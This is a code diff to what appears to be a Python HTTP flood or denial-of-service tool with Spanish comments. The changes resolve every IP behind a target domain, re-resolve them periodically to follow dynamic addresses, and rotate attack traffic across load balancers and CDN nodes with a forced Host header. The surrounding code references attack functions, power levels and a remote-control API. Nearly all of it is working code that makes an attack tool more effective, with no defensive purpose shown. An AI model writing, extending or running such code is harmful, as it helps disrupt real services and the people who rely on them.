@@ -258,6 +258,11 @@ RATE_ADAPTIVE = True  # Ajuste dinámico de tasa según respuesta
 CONNECTION_WARMUP = True  # Pre-calentar conexiones
 PARALLEL_DOMAINS = []  # Múltiples dominios en paralelo
 TARGET_VARIATIONS = []  # Variaciones del target (URLs diferentes)
+TARGET_IPS = []  # Lista de todas las IPs del target (para balanceadores, CDN, IPs dinámicas)
+DNS_RESOLUTION_INTERVAL = 30  # Intervalo de re-resolución DNS en segundos (para IPs dinámicas)
+DNS_RESOLUTION_ENABLED = True  # Activar re-resolución DNS periódica
+DNS_LAST_RESOLUTION = None  # Timestamp de última resolución DNS
+DNS_ROUND_ROBIN = True  # Distribuir conexiones entre múltiples IPs
 
 # Niveles de potencia
 POWER_LEVELS = {
@@ -847,6 +852,127 @@ def is_private_ip(ip_str: str) -> bool:
     except ValueError:
         return False
 
+def resolve_domain_ips(domain: str, prefer_ipv4: bool = True) -> List[str]:
+    """Resuelve TODAS las IPs de un dominio (IPv4 e IPv6)
+    
+    Args:
+        domain: Dominio a resolver
+        prefer_ipv4: Si es True, prioriza IPv4 sobre IPv6
+    
+    Returns:
+        Lista de IPs resueltas (sin duplicados)
+    """
+    import socket
+    resolved_ips = []
+    
+    try:
+        # Resolver todas las direcciones (IPv4 e IPv6)
+        # getaddrinfo retorna todas las IPs disponibles
+        addrinfo_list = socket.getaddrinfo(domain, None, socket.AF_UNSPEC, socket.SOCK_STREAM)
+        
+        for addr_info in addrinfo_list:
+            ip = addr_info[4][0]  # La IP está en la tupla (family, type, proto, canonname, sockaddr)
+            if ip not in resolved_ips:
+                resolved_ips.append(ip)
+        
+        # Si prefer_ipv4, ordenar para que IPv4 aparezca primero
+        if prefer_ipv4:
+            ipv4_ips = [ip for ip in resolved_ips if ':' not in ip]  # IPv4 no tiene ':'
+            ipv6_ips = [ip for ip in resolved_ips if ':' in ip]  # IPv6 tiene ':'
+            resolved_ips = ipv4_ips + ipv6_ips
+        
+        log_message("DEBUG", f"Resolución DNS múltiple: {domain} -> {len(resolved_ips)} IP(s)", context="resolve_domain_ips")
+        
+    except (socket.gaierror, socket.herror, OSError) as e:
+        log_message("WARN", f"Error resolviendo DNS múltiple para {domain}: {e}", context="resolve_domain_ips")
+        # Fallback a resolución simple
+        try:
+            resolved_ip = socket.gethostbyname(domain)
+            if resolved_ip not in resolved_ips:
+                resolved_ips.append(resolved_ip)
+        except:
+            pass
+    
+    return resolved_ips
+
+def refresh_dns_resolution(domain: str = None) -> List[str]:
+    """Re-resuelve el DNS del target para manejar IPs dinámicas
+    
+    Args:
+        domain: Dominio a resolver (si None, usa DOMAIN global)
+    
+    Returns:
+        Lista de IPs resueltas
+    """
+    global TARGET_IPS, IP_ADDRESS, DNS_LAST_RESOLUTION, DOMAIN
+    
+    if domain is None:
+        domain = DOMAIN
+    
+    if not domain:
+        return TARGET_IPS
+    
+    # Re-resolver todas las IPs
+    new_ips = resolve_domain_ips(domain)
+    
+    if new_ips:
+        # Detectar IPs nuevas
+        new_ips_set = set(new_ips)
+        old_ips_set = set(TARGET_IPS)
+        added_ips = new_ips_set - old_ips_set
+        removed_ips = old_ips_set - new_ips_set
+        
+        if added_ips or removed_ips:
+            log_message("INFO", f"🔄 [DNS] IPs actualizadas: {len(new_ips)} IP(s) totales", context="refresh_dns_resolution", force_console=True)
+            if added_ips:
+                log_message("INFO", f"  ➕ IPs nuevas: {', '.join(added_ips)}", context="refresh_dns_resolution", force_console=True)
+            if removed_ips:
+                log_message("INFO", f"  ➖ IPs removidas: {', '.join(removed_ips)}", context="refresh_dns_resolution", force_console=True)
+        
+        TARGET_IPS = new_ips
+        # Actualizar IP_ADDRESS a la primera IP (para compatibilidad)
+        if IP_ADDRESS not in TARGET_IPS:
+            IP_ADDRESS = TARGET_IPS[0] if TARGET_IPS else None
+        DNS_LAST_RESOLUTION = datetime.now()
+    else:
+        log_message("WARN", f"No se pudieron re-resolver IPs para {domain}, manteniendo IPs anteriores", context="refresh_dns_resolution")
+    
+    return TARGET_IPS
+
+def get_target_ip_round_robin() -> str:
+    """Obtiene una IP del target usando round-robin para distribuir carga
+    
+    Returns:
+        IP seleccionada
+    """
+    global TARGET_IPS, IP_ADDRESS
+    
+    if not TARGET_IPS:
+        return IP_ADDRESS or ""
+    
+    # Usar round-robin simple basado en contador
+    if not hasattr(get_target_ip_round_robin, '_counter'):
+        get_target_ip_round_robin._counter = 0
+    
+    ip = TARGET_IPS[get_target_ip_round_robin._counter % len(TARGET_IPS)]
+    get_target_ip_round_robin._counter += 1
+    
+    return ip
+
+def get_target_ip_random() -> str:
+    """Obtiene una IP aleatoria del target para distribuir carga
+    
+    Returns:
+        IP seleccionada aleatoriamente
+    """
+    global TARGET_IPS, IP_ADDRESS
+    
+    if not TARGET_IPS:
+        return IP_ADDRESS or ""
+    
+    import random
+    return random.choice(TARGET_IPS)
+
 def validate_critical_variables():
     """Valida variables críticas con mejor parsing y manejo de edge cases"""
     global TARGET, DOMAIN, IP_ADDRESS, TARGET_TYPE, NETWORK_TYPE, PROTOCOL, PORT
@@ -1000,15 +1126,24 @@ def validate_critical_variables():
             
             TARGET_TYPE = "DOMAIN"
             DOMAIN = target_host
-            # Resolver IP del dominio para evitar errores DNS repetitivos
-            try:
-                import socket
-                resolved_ip = socket.gethostbyname(target_host)
-                IP_ADDRESS = resolved_ip
-                log_message("DEBUG", f"DNS resuelto: {target_host} -> {resolved_ip}", context="validate_critical_variables")
-            except (socket.gaierror, socket.herror, OSError) as e:
-                IP_ADDRESS = None
-                log_message("WARN", f"No se pudo resolver DNS para {target_host}: {e}", context="validate_critical_variables", force_console=True)
+            # Resolver TODAS las IPs del dominio (para balanceadores, CDN, múltiples IPs)
+            resolved_ips = resolve_domain_ips(target_host)
+            if resolved_ips:
+                TARGET_IPS = resolved_ips
+                IP_ADDRESS = resolved_ips[0]  # Mantener compatibilidad con código existente
+                log_message("INFO", f"🌐 [DNS] Resueltas {len(resolved_ips)} IP(s) para {target_host}: {', '.join(resolved_ips[:5])}" + (f" (+{len(resolved_ips)-5} más)" if len(resolved_ips) > 5 else ""), context="validate_critical_variables", force_console=True)
+            else:
+                # Fallback a resolución simple si falla la resolución múltiple
+                try:
+                    import socket
+                    resolved_ip = socket.gethostbyname(target_host)
+                    IP_ADDRESS = resolved_ip
+                    TARGET_IPS = [resolved_ip]
+                    log_message("DEBUG", f"DNS resuelto (fallback): {target_host} -> {resolved_ip}", context="validate_critical_variables")
+                except (socket.gaierror, socket.herror, OSError) as e:
+                    IP_ADDRESS = None
+                    TARGET_IPS = []
+                    log_message("WARN", f"No se pudo resolver DNS para {target_host}: {e}", context="validate_critical_variables", force_console=True)
             NETWORK_TYPE = "PUBLIC"  # Los dominios generalmente apuntan a IPs públicas
             if WEB_PANEL_MODE:
                 log_message("INFO", f"🌐 [VALIDATION] Dominio detectado: {target_host}" + (f" -> {IP_ADDRESS}" if IP_ADDRESS else ""), context="validate_critical_variables", force_console=True)
@@ -5180,6 +5315,11 @@ def deploy_custom_http_attack():
                     # Filtrar pseudo-headers HTTP/2 que no son válidos en HTTP/1.1 (requests usa HTTP/1.1)
                     request_headers = {k: v for k, v in request_headers_raw.items() if not k.startswith(':')}
                     
+                    # Si hay múltiples IPs (balanceador, CDN) y estamos usando round-robin, agregar Host header
+                    # Esto asegura que el servidor identifique correctamente el dominio cuando conectamos por IP
+                    if DNS_ROUND_ROBIN and TARGET_IPS and len(TARGET_IPS) > 1 and DOMAIN:
+                        request_headers['Host'] = DOMAIN
+                    
                     # Alternar entre GET y POST con ratio optimizado
                     # Para SSL-VPN, usar más GET ya que POST puede ser rechazado
                     use_post = random.random() < 0.3 if "10443" in TARGET or "ssl" in TARGET.lower() else (random.random() < 0.85 if USE_LARGE_PAYLOADS else False)
@@ -8654,10 +8794,17 @@ def start_api_server(port: int = 8080):
     """Inicia servidor API REST para control remoto"""
     try:
         from flask import Flask, jsonify, request
-        from flask_cors import CORS
+        try:
+            from flask_cors import CORS  # type: ignore
+            CORS_AVAILABLE = True
+        except ImportError:
+            CORS_AVAILABLE = False
+            CORS = None
         
         app = Flask(__name__)
-        CORS(app)
+        # CORS es opcional - solo aplicar si está disponible
+        if CORS_AVAILABLE and CORS:
+            CORS(app)
         
         api_attack_process = None
         api_attack_thread = None
@@ -8878,6 +9025,7 @@ def monitor_attack():
     last_memory_check = start_time
     last_rps_calculation = start_time
     last_metrics_export = start_time
+    last_dns_refresh = start_time
     rps_history = []
     
     # Inicializar estadísticas avanzadas
@@ -8902,6 +9050,15 @@ def monitor_attack():
             if current_time - last_stats_time >= 5:
                 display_stats(elapsed)
                 last_stats_time = current_time
+            
+            # Re-resolución DNS periódica para IPs dinámicas (cada DNS_RESOLUTION_INTERVAL segundos)
+            if DNS_RESOLUTION_ENABLED and TARGET_TYPE == "DOMAIN" and DOMAIN:
+                if current_time - last_dns_refresh >= DNS_RESOLUTION_INTERVAL:
+                    try:
+                        refresh_dns_resolution(DOMAIN)
+                        last_dns_refresh = current_time
+                    except Exception as e:
+                        log_message("WARN", f"Error en re-resolución DNS: {e}", context="monitor_attack")
             
             # Calcular RPS cada segundo y actualizar peak
             if current_time - last_rps_calculation >= 1:
